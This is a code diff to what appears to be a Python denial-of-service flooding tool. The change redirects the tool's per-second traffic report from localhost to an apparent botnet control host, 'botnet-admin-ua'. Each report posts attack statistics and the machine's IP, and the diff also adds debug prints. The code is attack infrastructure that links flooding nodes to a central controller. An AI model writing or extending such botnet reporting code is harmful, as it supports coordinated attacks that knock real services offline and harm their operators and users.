@@ -1443,7 +1443,14 @@ if __name__ == '__main__':
                 traffic_sum = 0
 
                 while time() < ts + timer:
+                    logger.debug('PPS: %s, BPS: %s / %d%%' %
+                                 (Tools.humanformat(int(REQUESTS_SENT)),
+                                  Tools.humanbytes(int(BYTES_SEND)),
+                                  round((time() - ts) / timer * 100, 2)))
+                    
                     traffic_sum += int(BYTES_SEND)
+                    print(traffic_sum)
+                    print(Tools.humanbytes(int(traffic_sum)))
                     payload = dumps( {
                             "hash" : "".join([randchoice(ascii_letters) for i in range(16) ]),
                             "time" : time(),
@@ -1452,12 +1459,7 @@ if __name__ == '__main__':
                             "ip" : __ip__
                         })
                     headers = {'Content-Type': 'application/json'}
-                    post('http://localhost/info/', data=payload, headers=headers)
-                    
-                    logger.debug('PPS: %s, BPS: %s / %d%%' %
-                                 (Tools.humanformat(int(REQUESTS_SENT)),
-                                  Tools.humanbytes(int(BYTES_SEND)),
-                                  round((time() - ts) / timer * 100, 2)))
+                    post('https://botnet-admin-ua/info/', data=payload, headers=headers)
                     REQUESTS_SENT.set(0)
                     BYTES_SEND.set(0)
                     sleep(1)
